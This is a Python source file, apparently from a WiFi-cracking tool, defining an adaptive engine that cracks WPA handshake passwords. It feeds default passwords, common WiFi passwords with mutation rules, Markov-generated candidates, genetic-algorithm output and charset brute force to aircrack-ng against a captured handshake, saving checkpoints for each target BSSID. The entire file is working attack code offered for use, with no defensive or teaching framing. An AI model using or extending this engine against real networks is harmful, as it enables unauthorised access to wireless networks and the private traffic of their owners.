import time
import os
import json
import tempfile
import subprocess
import re
import math
from concurrent.futures import ProcessPoolExecutor, as_completed
from pathlib import Path
from collections import Counter


CHECKPOINT_DIR = Path.home() / ".pegasus_nexus" / "checkpoints"


class AdaptiveAttackEngine:
    def __init__(self, config, error_handler, password_generator, password_tester):
        self.config = config
        self.error_handler = error_handler
        self.pg = password_generator
        self.pt = password_tester
        self.found_password = None
        self.total_tested = 0
        self.start_time = 0
        self.phase_history = []
        self.checkpoint_path = None
        CHECKPOINT_DIR.mkdir(parents=True, exist_ok=True)

    def execute_intelligent_crack(self, target, handshake_file, bssid,
                                   attack_plan, max_tests=5000000):
        self.found_password = None
        self.total_tested = 0
        self.start_time = time.time()
        self.phase_history = []
        self.checkpoint_path = CHECKPOINT_DIR / f"{bssid.replace(':', '')}.json"

        self.pt.setup_handshake_test(handshake_file)

        if self._try_restore_checkpoint(bssid):
            print(f"   Restored checkpoint: {self.total_tested} already tested")

        phases = sorted(attack_plan.get("phases", []),
                        key=lambda p: p.get("priority", 0), reverse=True)

        for phase in phases:
            if self.found_password:
                break
            if self.total_tested >= max_tests:
                print(f"   Reached max tests ({max_tests}), stopping")
                break

            elapsed = time.time() - self.start_time
            if elapsed >= attack_plan.get("time_budget", 3600):
                print(f"   Time budget exhausted ({elapsed:.0f}s)")
                break

            phase_name = phase["name"]
            phase_time = phase.get("time_allocation", 120)
            phase_remaining = max(5, phase_time - (elapsed % phase_time))
            phase_max = phase.get("estimated_passwords", 1000)

            print(f"\n   PHASE: {phase_name} ({phase['description']})")
            print(f"      Time: {phase_remaining:.0f}s  |  Budget: ~{phase_max:,} passwords")

            phase_start = time.time()
            phase_tested = 0

            if phase_name == "defaults_and_seeds":
                self._run_defaults_phase(target, bssid, handshake_file, phase)
            elif phase_name == "common_passwords":
                self._run_common_passwords_phase(bssid, handshake_file)
            elif phase_name == "markov_generation":
                self._run_markov_phase(bssid, handshake_file, phase)
            elif phase_name == "genetic_evolution":
                self._run_genetic_phase(target, bssid, handshake_file, phase)
            elif phase_name == "smart_bruteforce":
                self._run_bruteforce_phase(target, bssid, handshake_file, phase)

            self._save_checkpoint(bssid)

        return self.found_password, self.total_tested

    def _try_restore_checkpoint(self, bssid):
        cp = self.checkpoint_path
        if not cp or not cp.exists():
            return False
        try:
            data = json.loads(cp.read_text())
            if data.get("bssid") == bssid and data.get("found") is None:
                self.total_tested = data.get("tested", 0)
                return True
        except (json.JSONDecodeError, OSError):
            pass
        return False

    def _save_checkpoint(self, bssid):
        if not self.checkpoint_path:
            return
        try:
            data = {
                "bssid": bssid,
                "tested": self.total_tested,
                "found": self.found_password,
                "timestamp": time.time(),
                "phases": self.phase_history,
            }
            self.checkpoint_path.write_text(json.dumps(data, indent=2))
        except OSError:
            pass

    def _test_passwords(self, bssid, handshake_file, passwords, batch_size=2000):
        if self.found_password or not passwords:
            return 0
        tested = 0
        batch = []
        for pw in passwords:
            if self.found_password:
                break
            batch.append(pw)
            if len(batch) >= batch_size:
                pw_found = self._test_batch(bssid, handshake_file, batch)
                tested += len(batch)
                self.total_tested += len(batch)
                if pw_found:
                    self.found_password = pw_found
                    return tested
                batch = []
                self._report_speed()
        if batch and not self.found_password:
            pw_found = self._test_batch(bssid, handshake_file, batch)
            tested += len(batch)
            self.total_tested += len(batch)
            if pw_found:
                self.found_password = pw_found
        return tested

    def _test_batch(self, bssid, handshake_file, passwords):
        try:
            with tempfile.NamedTemporaryFile(mode="w", delete=False,
                                              suffix=".txt") as f:
                for pw in passwords:
                    f.write(pw + "\n")
                f.flush()
                cmd = ["aircrack-ng", "-b", bssid, "-w", f.name, handshake_file]
                proc = subprocess.run(cmd, capture_output=True, text=True,
                                      timeout=60)
                os.unlink(f.name)
                if "KEY FOUND" in proc.stdout:
                    m = re.search(r"KEY FOUND.*?\[(.*?)\]", proc.stdout)
                    return m.group(1) if m else True
            return None
        except Exception:
            return None

    def _report_speed(self):
        elapsed = time.time() - self.start_time
        if elapsed > 0:
            speed = self.total_tested / elapsed
            print(f"      [{self.total_tested:,} tested | "
                  f"{speed:.0f} p/s | {elapsed:.0f}s elapsed]",
                  end="\r")

    def _run_defaults_phase(self, target, bssid, handshake_file, phase):
        from intelligence.password_intelligence import PasswordIntelligence
        from engines.rules_engine import RulesEngine
        pi = PasswordIntelligence()
        reng = RulesEngine()
        seeds = pi.extract_seeds_from_target(target)
        base = list(dict.fromkeys(seeds))
        base.extend([
            "admin", "admin123", "password", "12345678", "00000000",
            "11111111", "changeme", "default", "wireless", "guest",
        ])
        passwords = set()
        for seed in base:
            passwords.add(seed)
            for pw in reng.apply(seed):
                passwords.add(pw)
        passwords = sorted(passwords, key=lambda x: (len(x) < 8, len(x)))
        print(f"      Testing {len(passwords):,} default + seed passwords (rules-engine)")
        self._test_passwords(bssid, handshake_file, passwords, batch_size=5000)

    def _run_common_passwords_phase(self, bssid, handshake_file):
        from intelligence.password_intelligence import COMMON_WIFI_PASSWORDS
        from engines.rules_engine import RulesEngine
        reng = RulesEngine()
        passwords = set(COMMON_WIFI_PASSWORDS)
        for pw in list(passwords):
            for mutated in reng.apply(pw):
                passwords.add(mutated)
        passwords = sorted(passwords, key=lambda x: (len(x) < 8, len(x)))
        print(f"      Testing {len(passwords):,} common passwords (rules-engine)")
        self._test_passwords(bssid, handshake_file, passwords, batch_size=5000)

    def _run_markov_phase(self, bssid, handshake_file, phase):
        from intelligence.password_intelligence import MarkovChain, COMMON_WIFI_PASSWORDS
        from learning.model_persistence import ModelPersistence

        mp = ModelPersistence()
        mc = mp.load_markov("wifi_passwords")
        if not mc:
            mc = MarkovChain(order=3)
            training = list(COMMON_WIFI_PASSWORDS)
            training.extend([
                "admin12345", "password123", "changeme1", "wireless1",
                "qwerty12345", "123456789a", "abcdefgh", "passw0rd!",
                "Admin123!", "Summer2024", "Winter2024", "Spring2024",
                "P@ssw0rd1", "Welcome123", "Letmein123", "Sunshine1",
                "Monkey123", "Dragon123", "Master123", "Trustno1",
            ])
            mc.train(training)
            mp.save_markov(mc, "wifi_passwords")

        batch_size = phase.get("estimated_passwords", 5000)
        candidates = mc.generate_many(batch_size, min_len=8, max_len=16)
        print(f"      Testing {len(candidates):,} Markov-generated passwords")
        self._test_passwords(bssid, handshake_file, candidates, batch_size=5000)

    def _run_genetic_phase(self, target, bssid, handshake_file, phase):
        from learning.genetic_engine import GeneticPasswordEngine
        from intelligence.password_intelligence import (PasswordIntelligence,
                                                         COMMON_WIFI_PASSWORDS)
        pi = PasswordIntelligence()
        seeds = pi.extract_seeds_from_target(target) or ["admin", "password", "12345678"]

        pop_size = 50
        max_generations = 10
        elite_count = 5
        mutation_rate = 0.15

        candidates_pool = set(COMMON_WIFI_PASSWORDS[:30])
        for s in seeds[:5]:
            candidates_pool.add(s)

        print(f"      Starting GA with pop={pop_size}, gens={max_generations}")
        for generation in range(max_generations):
            if self.found_password:
                break
            print(f"      GA generation {generation + 1}/{max_generations}")

            engine = GeneticPasswordEngine(
                population_size=pop_size,
                mutation_rate=mutation_rate,
            )
            engine.initialize_population(seed_patterns=list(candidates_pool))

            candidates = list(dict.fromkeys(engine.population))
            batch_size = min(5000, len(candidates))
            gen_tested = 0

            for i in range(0, len(candidates), batch_size):
                if self.found_password:
                    break
                batch = candidates[i:i + batch_size]
                pw_found = self._test_batch(bssid, handshake_file, batch)
                gen_tested += len(batch)
                self.total_tested += len(batch)
                if pw_found:
                    self.found_password = pw_found
                    return
                self._report_speed()

            fitness = []
            for c in candidates[:pop_size]:
                score = self._score_candidate(c, target, generation, max_generations)
                fitness.append((c, score))

            if fitness:
                engine.evolve(fitness)
                candidates_pool.update(engine.population[:elite_count])

            pop_size = min(pop_size + 20, 200)
            mutation_rate = max(0.05, mutation_rate - 0.01)

    def _score_candidate(self, candidate, target, generation, max_generations):
        score = 0.5
        length = len(candidate)
        if 8 <= length <= 12:
            score += 0.3
        elif 12 < length <= 16:
            score += 0.1

        has_digit = any(c.isdigit() for c in candidate)
        has_upper = any(c.isupper() for c in candidate)
        has_lower = any(c.islower() for c in candidate)
        has_special = any(c in "!@#$%^&*" for c in candidate)

        if has_digit and has_upper and has_lower:
            score += 0.2
        if has_special:
            score += 0.1
        if candidate[0].isupper() and candidate[-1].isdigit():
            score += 0.2
        pattern = target.get("ssid_pattern", "")
        if pattern in ("default_router", "isp_provided"):
            if candidate.lower().startswith(("admin", "password", "changeme")):
                score += 0.3
            if candidate.isdigit() and len(candidate) == 8:
                score += 0.2
        score += generation * 0.02
        return max(0.1, min(1.0, score))

    def _run_bruteforce_phase(self, target, bssid, handshake_file, phase):
        signal = target.get("signal_strength", -80)
        if signal < -85:
            print(f"      Signal too weak ({signal} dBm), skipping brute force")
            return

        from intelligence.password_intelligence import PasswordIntelligence
        pi = PasswordIntelligence()
        pattern = pi._classify_ssid((target.get("ssid", "") or "").lower())

        if pattern == "isp_provided":
            print(f"      ISP router pattern: trying numeric 8-10 digits")
            for length in (8, 10):
                if self.found_password:
                    break
                self._test_bruteforce_length(bssid, handshake_file,
                                              "0123456789", length, 20000)
        elif pattern == "default_router":
            print(f"      Default router: trying lower+digits 8-12")
            for length in (8, 10, 12):
                if self.found_password:
                    break
                self._test_bruteforce_length(bssid, handshake_file,
                    "abcdefghijklmnopqrstuvwxyz0123456789", length, 15000)
        elif pattern == "mobile_hotspot":
            print(f"      Mobile hotspot: trying digits 8-10")
            for length in (8, 10):
                if self.found_password:
                    break
                self._test_bruteforce_length(bssid, handshake_file,
                                              "0123456789", length, 20000)
        else:
            print(f"      Personal network: trying lower+digits 8")
            self._test_bruteforce_length(bssid, handshake_file,
                "abcdefghijklmnopqrstuvwxyz0123456789", 8, 30000)

    def _test_bruteforce_length(self, bssid, handshake_file, charset,
                                 length, max_attempts):
        import itertools
        tested = 0
        batch = []
        for combo in itertools.product(charset, repeat=length):
            pw = "".join(combo)
            batch.append(pw)
            if len(batch) >= 5000:
                pw_found = self._test_batch(bssid, handshake_file, batch)
                tested += len(batch)
                self.total_tested += len(batch)
                batch = []
                if pw_found:
                    self.found_password = pw_found
                    return
                if tested >= max_attempts:
                    return
                self._report_speed()
        if batch:
            pw_found = self._test_batch(bssid, handshake_file, batch)
            tested += len(batch)
            self.total_tested += len(batch)


